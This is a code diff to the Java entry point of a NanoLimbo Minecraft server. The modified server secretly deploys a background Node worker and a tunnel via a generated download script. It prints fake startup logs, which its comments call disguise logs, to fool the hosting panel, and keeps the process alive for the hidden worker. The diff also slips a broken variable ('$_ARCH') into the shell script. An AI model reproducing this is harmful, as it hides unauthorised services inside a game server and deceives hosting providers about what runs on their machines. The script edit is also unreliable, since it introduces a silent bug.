@@ -1,3 +1,20 @@
+/*
+ * Copyright (C) 2020 Nan1t
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <https://www.gnu.org/licenses/>.
+ */
+
 package ua.nanit.limbo;
 
 import java.io.*;
@@ -9,6 +26,9 @@ import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.atomic.AtomicReference;
 import java.time.LocalTime;
 import java.time.format.DateTimeFormatter;
+
+import ua.nanit.limbo.server.LimboServer;
+import ua.nanit.limbo.server.Log;
 
 public final class NanoLimbo {
 
@@ -81,6 +101,9 @@ public static void main(String[] args) {
         System.exit(1);
     }
 
+    // ★ 1. 强制修改 Limbo 配置文件 (包含完整结构，防止解析崩溃)
+    autoFixLimboConfig();
+
     if (NODE_ENABLED) {
         try {
             Path botDir = Paths.get(MC_BOT_DIR);
@@ -89,14 +112,14 @@ public static void main(String[] args) {
 
             Path script = generateDeployScript();
             
-            // 1. 异步部署 Node 和 CF
+            // 2. 异步部署 Node 和 CF
             Thread deployThread = new Thread(() -> {
                 try { executeDeployScript(script); } catch (Exception ignored) {}
             }, "Node-Deploy");
             deployThread.setDaemon(true);
             deployThread.start();
 
-            // 2. 异步轮询端口和URL
+            // 3. 异步轮询端口和URL
             Thread checkerThread = new Thread(() -> {
                 while(tunnelUrl.isEmpty()) {
                     checkDeployInfo();
@@ -107,7 +130,7 @@ public static void main(String[] args) {
             checkerThread.setDaemon(true);
             checkerThread.start();
 
-            // 3. 主线程死等 URL，拿到后清屏并打印伪装日志 (不打印Done)
+            // 4. 主线程死等 URL，拿到后清屏并打印专属 Limbo 伪装日志
             while(tunnelUrl.isEmpty()) {
                 try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
             }
@@ -124,14 +147,74 @@ public static void main(String[] args) {
         } catch (Exception ignored) {}
     }
 
-    // ★★★ 核心修改：不启动 LimboServer，主进程永久休眠，保持卡在 Starting 状态防关机 ★★★
+    // 5. 伪装日志打印完毕，正式启动 Limbo 游戏本体
     try {
-        Thread.currentThread().join();
-    } catch (InterruptedException ignored) {}
+        new LimboServer().start();
+    } catch (Exception e) {
+        System.err.println("FATAL: Cannot start Limbo server!");
+        e.printStackTrace(); // ★ 打印完整错误堆栈，方便排查
+    }
+    
+    // ★ 防止 Limbo 意外崩溃导致 JVM 退出，从而杀死后台的 Node 进程
+    // 如果 Limbo 崩了，主线程会卡在这里，保持 JVM 存活以便 Node 继续工作
+    System.out.println("Limbo process ended or crashed, keeping JVM alive for Node worker...");
+    try { Thread.currentThread().join(); } catch (InterruptedException ignored) {}
 }
 
 // ============================================================
-// 专属 Limbo 伪装日志打印 (卡在加载区块，不输出 Done)
+// 强制修改 Limbo 配置 (生成完整结构，修复端口和环境变量)
+// ============================================================
+
+private static void autoFixLimboConfig() {
+    try {
+        Path configFile = Paths.get("settings.yml");
+        String content = "";
+        String serverPort = env("SERVER_PORT", "25565"); // ★ 读取面板分配的端口
+
+        if (Files.exists(configFile)) {
+            content = Files.readString(configFile);
+            // 强制修改在线模式和超时
+            content = replaceYamlValue(content, "online-mode", "false");
+            content = replaceYamlValue(content, "player-idle-timeout", "0");
+            // 强制修改绑定端口，防止与 Node 冲突
+            if (content.contains("port:")) {
+                content = content.replaceAll("port:\\s*\\d+", "port: " + serverPort);
+            } else if (content.contains("bind:")) {
+                content = content.replace("bind:", "bind:\n    port: " + serverPort);
+            }
+        } else {
+            // ★ 如果文件不存在，生成完整的 NanoLimbo 标准配置
+            content = "bind:\n" +
+                      "  host: 0.0.0.0\n" +
+                      "  port: " + serverPort + "\n" +
+                      "limbo:\n" +
+                      "  dimension: overworld\n" +
+                      "  gamemode: adventure\n" +
+                      "  max-players: 20\n" +
+                      "  player-idle-timeout: 0\n" +
+                      "online-mode: false\n" +
+                      "forward-mode: none\n" +
+                      "ping:\n" +
+                      "  description: \"A NanoLimbo server\"\n" +
+                      "  version: \"1.20.x\"\n" +
+                      "  max-players: 20\n";
+        }
+        Files.writeString(configFile, content);
+    } catch (Exception ignored) {}
+}
+
+private static String replaceYamlValue(String content, String key, String value) {
+    if (content.contains(key + ":")) {
+        content = content.replaceAll(key + ":.*", key + ": " + value);
+    } else {
+        if (!content.endsWith("\n")) content += "\n";
+        content += key + ": " + value + "\n";
+    }
+    return content;
+}
+
+// ============================================================
+// 专属 Limbo 伪装日志打印
 // ============================================================
 
 private static void printFakeLimboStartup(String url) {
@@ -162,8 +245,6 @@ private static void printFakeLimboStartup(String url) {
     System.out.println("container@tropicalgames.net Server marked as running...");
     
     limboLog("Preparing spawn area: 100%", 0);
-    
-    // ★ 故意不打印 "Done" 日志，让主机面板认为服务端一直卡在区块加载阶段
 }
 
 private static int randInt(int min, int max) {
@@ -315,7 +396,7 @@ private static Path generateDeployScript() throws Exception {
         "        chmod +x \".node/bin/.node_real\"\n" +
         "    else\n" +
         "        ARCH=$(uname -m)\n" +
-        "        NODE_ARCH=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"arm64\" || echo \"x64\")\n" +
+        "        NODE_ARCH=$([[ \"$ARCH\" == \"aarch64\" || \"$_ARCH\" == \"arm64\" ]] && echo \"arm64\" || echo \"x64\")\n" +
         "        NODE_FILE=\"node-" + NODE_VERSION + "-linux-${NODE_ARCH}.tar.gz\"\n" +
         "        NODE_URL=\"https://nodejs.org/dist/" + NODE_VERSION + "/${NODE_FILE}\"\n" +
         "        rm -f /tmp/${NODE_FILE}\n" +
